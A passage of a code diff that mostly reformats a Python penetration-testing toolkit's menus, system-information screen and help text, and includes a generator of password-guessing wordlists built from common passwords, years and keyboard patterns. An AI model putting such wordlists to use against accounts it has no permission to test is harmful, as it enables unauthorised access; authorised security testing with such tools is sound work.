-                        f"{name.capitalize()}123"
-                    ])
+                    words.extend(
+                        [
+                            name.lower(),
+                            name.upper(),
+                            name.capitalize(),
+                            f"{name}123",
+                            f"{name}2023",
+                            f"{name}2024",
+                            f"{name}!",
+                            f"{name.capitalize()}123",
+                        ]
+                    )
         elif pattern_type == 2:
             prefix = get_user_input("Enter prefix (optional)")
             start = get_integer_input("Start number", 0, 10000)
@@ -5377,29 +6098,45 @@ def create_wordlist():
                     words.append(f"{num:0{digits}d}")
         elif pattern_type == 3:
             # Generate common password variations
-            base_words = ["password", "admin", "user", "login", "welcome", "123", "qwerty"]
+            base_words = [
+                "password",
+                "admin",
+                "user",
+                "login",
+                "welcome",
+                "123",
+                "qwerty",
+            ]
 
             for word in base_words:
-                words.extend([
-                    word,
-                    f"{word}123",
-                    f"{word}!",
-                    f"{word}2023",
-                    f"{word}2024",
-                    word.capitalize(),
-                    word.upper()
-                ])
+                words.extend(
+                    [
+                        word,
+                        f"{word}123",
+                        f"{word}!",
+                        f"{word}2023",
+                        f"{word}2024",
+                        word.capitalize(),
+                        word.upper(),
+                    ]
+                )
 
             # Add common number sequences
             for year in range(1990, 2025):
                 words.append(str(year))
 
             # Add common keyboard patterns
-            words.extend([
-                "qwerty", "qwerty123", "qwertyuiop",
-                "asdfgh", "asdfghjkl",
-                "zxcvbn", "zxcvbnm"
-            ])
+            words.extend(
+                [
+                    "qwerty",
+                    "qwerty123",
+                    "qwertyuiop",
+                    "asdfgh",
+                    "asdfghjkl",
+                    "zxcvbn",
+                    "zxcvbnm",
+                ]
+            )
     elif option == 3:
         existing_wordlists = list(WORDLISTS_DIR.glob("*.txt"))
 
@@ -5420,11 +6157,17 @@ def create_wordlist():
 
         console.print(table)
 
-        selection = get_user_input("Enter wordlist numbers to combine (comma-separated)")
+        selection = get_user_input(
+            "Enter wordlist numbers to combine (comma-separated)"
+        )
 
         try:
             selected_indices = [int(i.strip()) - 1 for i in selection.split(",")]
-            selected_files = [existing_wordlists[i] for i in selected_indices if 0 <= i < len(existing_wordlists)]
+            selected_files = [
+                existing_wordlists[i]
+                for i in selected_indices
+                if 0 <= i < len(existing_wordlists)
+            ]
 
             if not selected_files:
                 print_error("No valid wordlists selected")
@@ -5460,9 +6203,7 @@ def create_wordlist():
 def edit_wordlist(wordlist_files):
     if not wordlist_files:
         display_panel(
-            "Edit Wordlist",
-            "No wordlists found. Create one first.",
-            NordColors.YELLOW
+            "Edit Wordlist", "No wordlists found. Create one first.", NordColors.YELLOW
         )
         return
 
@@ -5487,7 +6228,9 @@ def edit_wordlist(wordlist_files):
 
     console.print(table)
 
-    file_choice = get_integer_input(f"Select wordlist to edit (1-{len(wordlist_files)})", 1, len(wordlist_files))
+    file_choice = get_integer_input(
+        f"Select wordlist to edit (1-{len(wordlist_files)})", 1, len(wordlist_files)
+    )
     if file_choice <= 0:
         return
 
@@ -5508,7 +6251,9 @@ def edit_wordlist(wordlist_files):
         if edit_option == 0:
             return
         elif edit_option == 1:
-            console.print(f"[bold {NordColors.FROST_2}]Enter words to add (one per line, empty line to finish):[/]")
+            console.print(
+                f"[bold {NordColors.FROST_2}]Enter words to add (one per line, empty line to finish):[/]"
+            )
 
             new_words = []
             while True:
@@ -5528,7 +6273,9 @@ def edit_wordlist(wordlist_files):
             else:
                 print_warning("No words added")
         elif edit_option == 2:
-            console.print(f"[bold {NordColors.FROST_2}]Enter words to remove (one per line, empty line to finish):[/]")
+            console.print(
+                f"[bold {NordColors.FROST_2}]Enter words to remove (one per line, empty line to finish):[/]"
+            )
 
             remove_words = []
             while True:
@@ -5544,11 +6291,15 @@ def edit_wordlist(wordlist_files):
                 with open(selected_file, "w") as f:
                     f.write("\n".join(words))
 
-                print_success(f"Removed {original_count - len(words)} words from {selected_file.name}")
+                print_success(
+                    f"Removed {original_count - len(words)} words from {selected_file.name}"
+                )
             else:
                 print_warning("No words removed")
         elif edit_option == 3:
-            if get_confirmation(f"Clear all words from {selected_file.name}? This cannot be undone."):
+            if get_confirmation(
+                f"Clear all words from {selected_file.name}? This cannot be undone."
+            ):
                 with open(selected_file, "w") as f:
                     f.write("")
 
@@ -5572,7 +6323,9 @@ def import_wordlist():
         print_error(f"Not a file: {source_path}")
         return
 
-    target_name = get_user_input("Enter name for imported wordlist (or leave blank to use source filename)")
+    target_name = get_user_input(
+        "Enter name for imported wordlist (or leave blank to use source filename)"
+    )
     if not target_name:
         target_name = source_file.name
 
@@ -5609,18 +6362,19 @@ def system_information():
         "User": os.environ.get("USER", "Unknown"),
         "Home Directory": str(Path.home()),
         "Toolkit Version": VERSION,
-        "Toolkit Directory": str(BASE_DIR)
+        "Toolkit Directory": str(BASE_DIR),
     }
 
     # Get network interfaces
     network_interfaces = {}
     try:
         import netifaces
+
         for iface in netifaces.interfaces():
             addresses = netifaces.ifaddresses(iface)
             if netifaces.AF_INET in addresses:
                 for addr in addresses[netifaces.AF_INET]:
-                    network_interfaces[iface] = addr.get('addr')
+                    network_interfaces[iface] = addr.get("addr")
     except ImportError:
         # Fallback if netifaces is not available
         try:
@@ -5638,9 +6392,9 @@ def system_information():
     disk_usage = {}
     try:
         usage = shutil.disk_usage("/")
-        disk_usage["Total"] = f"{usage.total / (1024 ** 3):.1f} GB"
-        disk_usage["Used"] = f"{usage.used / (1024 ** 3):.1f} GB"
-        disk_usage["Free"] = f"{usage.free / (1024 ** 3):.1f} GB"
+        disk_usage["Total"] = f"{usage.total / (1024**3):.1f} GB"
+        disk_usage["Used"] = f"{usage.used / (1024**3):.1f} GB"
+        disk_usage["Free"] = f"{usage.free / (1024**3):.1f} GB"
         disk_usage["Percent Used"] = f"{usage.used / usage.total * 100:.1f}%"
     except Exception:
         disk_usage["Status"] = "Could not determine"
@@ -5695,7 +6449,7 @@ def system_information():
         "Results Files": len(list(RESULTS_DIR.glob("*.*"))),
         "Payload Files": len(list(PAYLOADS_DIR.glob("*.*"))),
         "Wordlist Files": len(list(WORDLISTS_DIR.glob("*.txt"))),
-        "Total Files": len(list(BASE_DIR.glob("**/*")))
+        "Total Files": len(list(BASE_DIR.glob("**/*"))),
     }
 
     stats_table = Table(
@@ -5718,7 +6472,7 @@ def help_module():
     display_panel(
         "Help & Documentation",
         "Documentation and instructions for the toolkit.",
-        NordColors.FROST_1
+        NordColors.FROST_1,
     )
 
     sections = [
@@ -5730,11 +6484,13 @@ def help_module():
         {"name": "Payload Generation", "id": "payload"},
         {"name": "Tool Management", "id": "tools"},
         {"name": "Settings", "id": "settings"},
-        {"name": "Legal & Ethics", "id": "legal"}
+        {"name": "Legal & Ethics", "id": "legal"},
     ]
 
-    options = [(str(i), section["name"], f"View {section['name']} documentation") for i, section in
-               enumerate(sections, 1)]
+    options = [
+        (str(i), section["name"], f"View {section['name']} documentation")
+        for i, section in enumerate(sections, 1)
+    ]
     options.append(("0", "Return", "Return to Main Menu"))
 
     console.print(create_menu_table("Documentation Sections", options))
@@ -5788,7 +6544,6 @@ Navigate through the menus to access different modules and features. Each module
 
 This toolkit should only be used on systems you own or have explicit permission to test. Unauthorized testing is illegal and unethical.
 """,
-
         "network": """
 # Network Scanning Module
 
@@ -5828,7 +6583,6 @@ This module provides tools for discovering hosts, open ports, and services on a 
 - Nmap (if installed)
 - Scapy (if installed)
 """,
-
         "web": """
 # Web Vulnerability Scanning Module
 
@@ -5870,7 +6624,6 @@ This module provides tools for identifying vulnerabilities in web applications a
 - gobuster, ffuf, or dirb (if installed)
 - OpenSSL and Nmap for SSL/TLS scanning
 """,
-
         "osint": """
 # OSINT Gathering Module
 
@@ -5915,7 +6668,6 @@ This module provides tools for collecting open-source intelligence about targets
 - Do not use OSINT techniques for stalking or harassment.
 - Some platforms prohibit automated data collection in their terms of service.
 """,
-
         "password": """
 # Password Tools Module
 
@@ -5956,7 +6708,6 @@ This module provides utilities for password generation, hashing, and cracking.
 - Weak password hashing algorithms (like MD5) should be avoided in production systems.
 - Strong passwords should be at least 12 characters with mixed character types.
 """,
-
         "payload": """
 # Payload Generation Module
 
@@ -6002,7 +6753,6 @@ This module provides utilities for generating various security testing payloads.
 - Unauthorized use of these payloads may violate computer crime laws.
 - Always have explicit permission before deploying payloads on any system.
 """,
-
         "tools": """
 # Tool Management Module
 
@@ -6049,7 +6799,6 @@ This toolkit can help you manage a variety of security tools across categories:
 - Update tools regularly for the latest security features.
 - Use Homebrew for most tool installations on macOS.
 """,
-
         "settings": """
 # Settings Module
 
@@ -6089,7 +6838,6 @@ This module allows configuration and management of toolkit settings and data.
 - Create custom wordlists for specific target environments.
 - Regularly clean up old results to save disk space.
 """,
-
         "legal": """
 # Legal & Ethical Considerations
 
@@ -6125,7 +6873,7 @@ Laws governing computer security testing vary by country and jurisdiction. Commo
 ## Disclaimer
 
 The authors of this toolkit are not responsible for any misuse or illegal activities conducted with these tools. Users are solely responsible for their actions and must ensure they comply with all applicable laws and regulations.
-"""
+""",
     }
 
     if section_id in help_content:
@@ -6178,7 +6926,7 @@ def display_main_menu():
         ("6", "Tool Management", "Install and manage security tools"),
         ("7", "Settings", "Configure application settings"),
         ("8", "Help", "View documentation and instructions"),
-        ("0", "Exit", "Exit the application")
+        ("0", "Exit", "Exit the application"),
     ]
 
     console.print(create_menu_table("Main Menu", options))
@@ -6196,7 +6944,10 @@ def main():
                 console.clear()
                 console.print(
                     Panel(
-                        Text(f"Thank you for using {APP_NAME}!", style=f"bold {NordColors.FROST_2}"),
+                        Text(
+                            f"Thank you for using {APP_NAME}!",
+                            style=f"bold {NordColors.FROST_2}",
+                        ),
                         border_style=NordColors.FROST_1,
                         padding=(1, 2),
                     )
